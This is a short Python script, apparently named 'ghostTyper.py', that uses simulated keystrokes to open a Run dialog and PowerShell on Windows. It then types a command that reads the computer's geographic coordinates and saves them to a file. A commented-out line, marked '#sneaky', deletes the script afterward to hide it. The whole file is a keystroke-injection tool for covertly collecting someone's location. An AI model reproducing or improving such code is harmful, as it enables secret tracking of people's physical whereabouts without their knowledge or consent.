from pynput.keyboard import Key, Controller
import time, sys

# determine what os is being ran
# sys.platform 
keyboard = Controller()
time.sleep(3)

# press Win+R
keyboard.press(Key.cmd)
keyboard.press('r')
keyboard.release(Key.cmd)
keyboard.release('r')
# type cmd
for idx in ' powershell':
    keyboard.press(idx)
    time.sleep(.25)
    keyboard.release(idx)
keyboard.press(Key.enter)
val = "  $val = Add-Type -AssemblyName System.Device\n"\
    "$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher\n$GeoWatcher.Start()\n "\
    "while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100} if ($GeoWatcher.Permission -eq 'Denied'){Write-Error 'Access Denied for Location Information'}"\
    "else {$location = $GeoWatcher.Position.Location | Select Latitude,Longitude}" \
    "echo $location > results.txt"

# begin typing, takes some time 
for idx in val:
    keyboard.press(idx)
    time.sleep(.1 )
    keyboard.release(idx)
keyboard.press(Key.enter)

# remove the file, #sneaky
# os.remove('ghostTyper.py')


